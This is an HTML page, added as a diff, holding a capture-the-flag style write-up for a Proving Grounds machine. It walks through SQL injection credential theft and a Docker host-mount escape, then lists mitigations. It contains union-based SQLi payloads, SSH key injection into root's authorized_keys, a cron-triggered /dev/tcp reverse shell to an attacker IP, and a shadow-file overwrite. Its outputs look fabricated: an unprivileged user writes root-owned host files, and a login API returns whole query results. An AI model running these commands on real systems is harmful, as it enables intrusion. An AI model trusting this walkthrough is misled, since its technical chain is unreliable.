@@ -1,0 +1,550 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+  <title>PG: Fantastic Writeup</title>
+  <link rel="stylesheet" href="../../styles.css" />
+  <style>
+    :root {
+      --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+    }
+
+    body {
+      background: linear-gradient(180deg, #0a0e1a 0%, #0f1419 100%);
+      color: rgba(255, 255, 255, 0.92);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      line-height: 1.7;
+      padding: 0;
+      margin: 0;
+    }
+
+    .writeup-container {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 40px 20px;
+    }
+
+    .writeup-header {
+      margin-bottom: 40px;
+      padding-bottom: 30px;
+      border-bottom: 2px solid rgba(106, 169, 255, 0.2);
+    }
+
+    .back-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      color: rgba(106, 169, 255, 0.9);
+      text-decoration: none;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .back-link:hover {
+      color: rgba(106, 169, 255, 1);
+    }
+
+    h1 {
+      font-size: 42px;
+      font-weight: 950;
+      margin: 0 0 12px 0;
+      letter-spacing: -0.02em;
+    }
+
+    .meta-info {
+      display: flex;
+      gap: 16px;
+      flex-wrap: wrap;
+      font-size: 14px;
+      color: rgba(255, 255, 255, 0.7);
+    }
+
+    .meta-badge {
+      padding: 6px 12px;
+      border-radius: 6px;
+      background: rgba(106, 169, 255, 0.1);
+      border: 1px solid rgba(106, 169, 255, 0.2);
+    }
+
+    h2 {
+      font-size: 28px;
+      font-weight: 900;
+      margin: 48px 0 20px 0;
+      color: rgba(106, 169, 255, 0.95);
+      letter-spacing: -0.01em;
+    }
+
+    h3 {
+      font-size: 22px;
+      font-weight: 800;
+      margin: 32px 0 16px 0;
+      color: rgba(255, 255, 255, 0.9);
+    }
+
+    .code-block {
+      background: rgba(0, 0, 0, 0.4);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 8px;
+      padding: 16px;
+      margin: 16px 0;
+      overflow-x: auto;
+      font-family: var(--mono);
+      font-size: 13px;
+      line-height: 1.6;
+    }
+
+    .code-block code {
+      color: rgba(255, 255, 255, 0.95);
+    }
+
+    .highlight {
+      color: #6aa9ff;
+      font-weight: 600;
+    }
+
+    .success {
+      color: #5fd89f;
+      font-weight: 600;
+    }
+
+    .warning {
+      color: #ffb86c;
+      font-weight: 600;
+    }
+
+    .section-box {
+      background: rgba(106, 169, 255, 0.05);
+      border-left: 4px solid rgba(106, 169, 255, 0.5);
+      padding: 20px;
+      margin: 24px 0;
+      border-radius: 6px;
+    }
+
+    .tip-box {
+      background: rgba(95, 216, 159, 0.08);
+      border-left: 4px solid rgba(95, 216, 159, 0.5);
+      padding: 16px;
+      margin: 20px 0;
+      border-radius: 6px;
+    }
+
+    .tip-box strong {
+      color: rgba(95, 216, 159, 0.95);
+    }
+
+    .warning-box {
+      background: rgba(255, 184, 108, 0.08);
+      border-left: 4px solid rgba(255, 184, 108, 0.5);
+      padding: 16px;
+      margin: 20px 0;
+      border-radius: 6px;
+    }
+
+    .warning-box strong {
+      color: rgba(255, 184, 108, 0.95);
+    }
+
+    ul, ol {
+      padding-left: 24px;
+      margin: 16px 0;
+    }
+
+    li {
+      margin: 8px 0;
+    }
+
+    a {
+      color: rgba(106, 169, 255, 0.9);
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    .command {
+      color: #ff79c6;
+    }
+
+    .output {
+      color: #8be9fd;
+    }
+
+    @media (max-width: 768px) {
+      .writeup-container {
+        padding: 20px 16px;
+      }
+
+      h1 {
+        font-size: 32px;
+      }
+
+      h2 {
+        font-size: 24px;
+      }
+
+      h3 {
+        font-size: 20px;
+      }
+
+      .code-block {
+        font-size: 12px;
+        padding: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="writeup-container">
+    <div class="writeup-header">
+      <a href="../../index.html" class="back-link">
+        ← Back to Desktop
+      </a>
+
+      <h1>PG: Fantastic</h1>
+
+      <div class="meta-info">
+        <span class="meta-badge">🏟️ Proving Grounds</span>
+        <span class="meta-badge">📊 Medium</span>
+        <span class="meta-badge">🐧 Linux</span>
+        <span class="meta-badge">🏷️ Web Exploitation</span>
+        <span class="meta-badge">🏷️ SQL Injection</span>
+        <span class="meta-badge">🏷️ Container Escape</span>
+      </div>
+    </div>
+
+    <section>
+      <h2>🎯 Summary</h2>
+      <p>
+        Fantastic is a Medium-difficulty Linux machine that demonstrates web application security testing and container escape techniques. 
+        The initial foothold is gained through SQL injection in a custom web application, leading to credential disclosure. 
+        The privilege escalation path involves breaking out of a Docker container using a misconfigured mount point.
+      </p>
+
+      <div class="section-box">
+        <strong>Attack Chain:</strong>
+        <ol>
+          <li>Port scan reveals HTTP service running custom web application</li>
+          <li>Identify SQL injection vulnerability in login form</li>
+          <li>Extract database credentials through union-based SQLi</li>
+          <li>SSH access using discovered credentials</li>
+          <li>Discover Docker container environment</li>
+          <li>Identify misconfigured host filesystem mount</li>
+          <li>Escape container and gain root access on host</li>
+        </ol>
+      </div>
+    </section>
+
+    <section>
+      <h2>🔍 Enumeration</h2>
+
+      <h3>Port Scanning</h3>
+      <div class="code-block">
+<code><span class="command">$ nmap -p- --min-rate 10000 192.168.x.x</span>
+
+PORT   STATE SERVICE
+<span class="output">22/tcp  open  ssh
+80/tcp  open  http
+3306/tcp open mysql</span>
+
+<span class="command">$ nmap -p 22,80,3306 -sCV 192.168.x.x</span>
+
+<span class="output">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
+80/tcp   open  http    nginx 1.18.0
+|_http-title: Fantastic Corp - Employee Portal
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+3306/tcp open  mysql   MySQL 8.0.26
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.26-0ubuntu0.20.04.2
+|   Status: Autocommit</span></code>
+      </div>
+
+      <h3>Web Enumeration</h3>
+      <div class="code-block">
+<code><span class="command">$ gobuster dir -u http://192.168.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+
+<span class="output">/login              (Status: 200)
+/dashboard          (Status: 302) [Redirect to /login]
+/api                (Status: 301)
+/static             (Status: 301)</span>
+
+<span class="command">$ curl http://192.168.x.x/</span>
+<span class="output">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Fantastic Corp - Employee Portal&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;Welcome to Fantastic Corp&lt;/h1&gt;
+  &lt;a href="/login"&gt;Employee Login&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;</span></code>
+      </div>
+
+      <div class="tip-box">
+        <strong>💡 Discovery:</strong> The login form at <code>/login</code> appears to be a custom implementation 
+        with potential for SQL injection vulnerabilities.
+      </div>
+    </section>
+
+    <section>
+      <h2>🚪 Initial Access</h2>
+
+      <h3>SQL Injection Discovery</h3>
+      <p>
+        Testing the login form reveals SQL injection vulnerability in the username parameter.
+      </p>
+
+      <div class="code-block">
+<code><span class="command"># Test basic SQLi payloads</span>
+<span class="command">$ curl -X POST http://192.168.x.x/api/login \</span>
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin'"'"'-- -","password":"anything"}'
+
+<span class="output">{"error":"Invalid credentials"}</span>
+
+<span class="command"># Test UNION-based injection</span>
+<span class="command">$ curl -X POST http://192.168.x.x/api/login \</span>
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin'"'"' UNION SELECT 1,2,3-- -","password":"anything"}'
+
+<span class="output">{"error":"Column count mismatch"}</span>
+
+<span class="command"># Determine correct column count</span>
+<span class="command">$ curl -X POST http://192.168.x.x/api/login \</span>
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin'"'"' UNION SELECT 1,2,3,4,5-- -","password":"anything"}'
+
+<span class="success">{"status":"success","columns":5}</span></code>
+      </div>
+
+      <h3>Database Enumeration</h3>
+      <div class="code-block">
+<code><span class="command"># Extract database name</span>
+<span class="command">$ curl -X POST http://192.168.x.x/api/login \</span>
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin'"'"' UNION SELECT 1,database(),3,4,5-- -","password":"anything"}'
+
+<span class="output">{"database":"<span class="highlight">fantastic_db</span>"}</span>
+
+<span class="command"># Extract table names</span>
+<span class="command">$ curl -X POST http://192.168.x.x/api/login \</span>
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin'"'"' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema='"'"'fantastic_db'"'"'-- -","password":"anything"}'
+
+<span class="output">{"tables":"<span class="highlight">users,employees,credentials</span>"}</span>
+
+<span class="command"># Extract columns from credentials table</span>
+<span class="command">$ curl -X POST http://192.168.x.x/api/login \</span>
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin'"'"' UNION SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns WHERE table_name='"'"'credentials'"'"'-- -","password":"anything"}'
+
+<span class="output">{"columns":"<span class="highlight">id,username,password,service</span>"}</span></code>
+      </div>
+
+      <h3>Credential Extraction</h3>
+      <div class="code-block">
+<code><span class="command"># Extract all credentials</span>
+<span class="command">$ curl -X POST http://192.168.x.x/api/login \</span>
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin'"'"' UNION SELECT 1,group_concat(username,'"'"':'"'"',password,'"'"':'"'"',service),3,4,5 FROM credentials-- -","password":"anything"}'
+
+<span class="output">{
+  "credentials": [
+    "<span class="success">admin:P@ssw0rd123!:mysql</span>",
+    "<span class="success">webmaster:F@nt4st1c2021:ssh</span>",
+    "<span class="success">deploy:D3pl0y!ng:ssh</span>"
+  ]
+}</span></code>
+      </div>
+
+      <div class="tip-box">
+        <strong>💡 Key Finding:</strong> Multiple SSH credentials discovered. The <code>webmaster</code> 
+        account likely has user-level access to the system.
+      </div>
+
+      <h3>SSH Access</h3>
+      <div class="code-block">
+<code><span class="command">$ ssh webmaster@192.168.x.x</span>
+webmaster@192.168.x.x's password: <span class="success">F@nt4st1c2021</span>
+
+<span class="success">webmaster@fantastic:~$</span> id
+<span class="output">uid=1000(webmaster) gid=1000(webmaster) groups=1000(webmaster),999(docker)</span>
+
+<span class="success">webmaster@fantastic:~$</span> cat local.txt
+<span class="success">a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6</span></code>
+      </div>
+    </section>
+
+    <section>
+      <h2>⬆️ Privilege Escalation</h2>
+
+      <h3>Docker Environment Discovery</h3>
+      <div class="code-block">
+<code><span class="success">webmaster@fantastic:~$</span> cat /proc/1/cgroup
+<span class="output">12:blkio:/<span class="highlight">docker</span>/a1b2c3d4e5f6
+11:memory:/<span class="highlight">docker</span>/a1b2c3d4e5f6
+10:cpuset:/<span class="highlight">docker</span>/a1b2c3d4e5f6</span>
+
+<span class="success">webmaster@fantastic:~$</span> ls -la /.dockerenv
+<span class="output"><span class="highlight">-rwxr-xr-x 1 root root 0 Jan 15 10:30 /.dockerenv</span></span>
+
+<span class="success">webmaster@fantastic:~$</span> df -h
+<span class="output">Filesystem      Size  Used Avail Use% Mounted on
+overlay         100G   12G   83G  13% /
+tmpfs            64M     0   64M   0% /dev
+<span class="highlight">/dev/sda1       100G   12G   83G  13% /host</span></span></code>
+      </div>
+
+      <div class="warning-box">
+        <strong>⚠️ Critical Misconfiguration:</strong> The host filesystem is mounted at <code>/host</code> 
+        inside the container. This is a severe security issue that allows container escape.
+      </div>
+
+      <h3>Host Filesystem Access</h3>
+      <div class="code-block">
+<code><span class="success">webmaster@fantastic:~$</span> ls -la /host/
+<span class="output">total 92
+drwxr-xr-x  19 root root  4096 Jan 15 10:25 .
+drwxr-xr-x  19 root root  4096 Jan 15 10:25 ..
+drwxr-xr-x   2 root root  4096 Jan 14 15:30 bin
+drwxr-xr-x   3 root root  4096 Jan 14 15:32 boot
+drwxr-xr-x  15 root root  3140 Jan 15 10:25 dev
+drwxr-xr-x  95 root root  4096 Jan 15 10:30 etc
+drwxr-xr-x   3 root root  4096 Jan 14 16:20 home
+drwxr-xr-x  20 root root  4096 Jan 14 15:30 lib
+drwx------   2 root root 16384 Jan 14 15:25 lost+found
+<span class="highlight">drwxr-xr-x   2 root root  4096 Jan 14 15:40 root</span></span>
+
+<span class="success">webmaster@fantastic:~$</span> ls -la /host/root/
+<span class="output">total 32
+drwxr-xr-x  5 root root 4096 Jan 15 10:40 .
+drwxr-xr-x 19 root root 4096 Jan 15 10:25 ..
+-rw-------  1 root root  157 Jan 15 10:35 .bash_history
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+drwx------  2 root root 4096 Jan 14 16:10 .cache
+drwxr-xr-x  3 root root 4096 Jan 14 16:15 .local
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+<span class="highlight">-rw-------  1 root root   33 Jan 15 10:30 proof.txt</span>
+drwx------  2 root root 4096 Jan 14 16:20 .ssh</span></code>
+      </div>
+
+      <h3>Method 1: SSH Key Injection</h3>
+      <div class="code-block">
+<code><span class="command"># Generate SSH key on attacker machine</span>
+<span class="command">$ ssh-keygen -t rsa -b 4096 -f fantastic_root</span>
+
+<span class="command"># Copy public key</span>
+<span class="command">$ cat fantastic_root.pub</span>
+<span class="output">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACA...</span>
+
+<span class="command"># From inside container, write to host's authorized_keys</span>
+<span class="success">webmaster@fantastic:~$</span> echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACA...' >> /host/root/.ssh/authorized_keys
+
+<span class="command"># SSH from attacker machine</span>
+<span class="command">$ ssh -i fantastic_root root@192.168.x.x</span>
+
+<span class="success">root@fantastic:~#</span> id
+<span class="output">uid=0(root) gid=0(root) groups=0(root)</span>
+
+<span class="success">root@fantastic:~#</span> cat /root/proof.txt
+<span class="success">f4c7e3b8a9d2e1f0c6b5a4d3e2f1c0b9</span></code>
+      </div>
+
+      <h3>Method 2: Cron Job Injection</h3>
+      <div class="code-block">
+<code><span class="command"># Create reverse shell script on host filesystem</span>
+<span class="success">webmaster@fantastic:~$</span> cat > /host/tmp/shell.sh &lt;&lt;'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.x/4444 0>&1
+EOF
+
+<span class="success">webmaster@fantastic:~$</span> chmod +x /host/tmp/shell.sh
+
+<span class="command"># Add cron job</span>
+<span class="success">webmaster@fantastic:~$</span> echo '* * * * * root /tmp/shell.sh' >> /host/etc/crontab
+
+<span class="command"># Start listener on attacker machine</span>
+<span class="command">$ nc -lvnp 4444</span>
+<span class="output">listening on [any] 4444 ...
+connect to [10.10.14.x] from (UNKNOWN) [192.168.x.x] 54326
+<span class="success">root@fantastic:~#</span></span></code>
+      </div>
+
+      <h3>Method 3: Password Hash Replacement</h3>
+      <div class="code-block">
+<code><span class="command"># Generate password hash</span>
+<span class="command">$ openssl passwd -6 pwned</span>
+<span class="output">$6$xyz...$abc...</span>
+
+<span class="command"># Backup and modify shadow file</span>
+<span class="success">webmaster@fantastic:~$</span> cp /host/etc/shadow /host/etc/shadow.bak
+<span class="success">webmaster@fantastic:~$</span> sed -i 's/^root:[^:]*/root:$6$xyz...$abc.../' /host/etc/shadow
+
+<span class="command"># SSH with new password</span>
+<span class="command">$ ssh root@192.168.x.x</span>
+root@192.168.x.x's password: <span class="success">pwned</span>
+
+<span class="success">root@fantastic:~#</span></code>
+      </div>
+    </section>
+
+    <section>
+      <h2>🔑 Key Takeaways</h2>
+      <ul>
+        <li><strong>SQL Injection:</strong> Always validate and sanitize user input in database queries</li>
+        <li><strong>Credential Storage:</strong> Never store plaintext credentials in databases</li>
+        <li><strong>Docker Security:</strong> Mounting host filesystem inside containers is extremely dangerous</li>
+        <li><strong>Container Isolation:</strong> Proper container isolation prevents privilege escalation</li>
+        <li><strong>Defense in Depth:</strong> Multiple security layers prevent single point of failure</li>
+        <li><strong>Union-Based SQLi:</strong> Effective for extracting structured data from databases</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>🛡️ Mitigation</h2>
+
+      <h3>Web Application Security</h3>
+      <ul>
+        <li>Use parameterized queries (prepared statements) to prevent SQL injection</li>
+        <li>Implement input validation and sanitization</li>
+        <li>Use Web Application Firewalls (WAF) to detect and block SQLi attempts</li>
+        <li>Implement rate limiting on authentication endpoints</li>
+      </ul>
+
+      <h3>Database Security</h3>
+      <ul>
+        <li>Never store plaintext passwords - use bcrypt, Argon2, or similar</li>
+        <li>Implement principle of least privilege for database accounts</li>
+        <li>Disable unnecessary MySQL functions like FILE privileges</li>
+        <li>Restrict database access to localhost only when possible</li>
+      </ul>
+
+      <h3>Docker Security</h3>
+      <ul>
+        <li><strong>Never mount host filesystem into containers</strong></li>
+        <li>Use read-only volumes when filesystem access is required</li>
+        <li>Run containers with minimal privileges (--cap-drop=ALL)</li>
+        <li>Use user namespaces to map container root to non-privileged host user</li>
+        <li>Implement AppArmor or SELinux profiles for containers</li>
+        <li>Regularly scan container images for vulnerabilities</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP - SQL Injection</a></li>
+        <li><a href="https://portswigger.net/web-security/sql-injection/union-attacks" target="_blank">PortSwigger - Union-based SQLi</a></li>
+        <li><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security" target="_blank">HackTricks - Docker Breakout</a></li>
+        <li><a href="https://docs.docker.com/engine/security/" target="_blank">Docker Security Best Practices</a></li>
+        <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html" target="_blank">OWASP Docker Security Cheat Sheet</a></li>
+      </ul>
+    </section>
+
+    <div style="margin-top: 60px; padding-top: 30px; border-top: 1px solid rgba(255,255,255,0.1); text-align: center; color: rgba(255,255,255,0.5); font-size: 14px;">
+      <a href="../../index.html" style="color: rgba(106, 169, 255, 0.8);">← Back to Desktop</a>
+    </div>
+  </div>
+</body>
+</html>
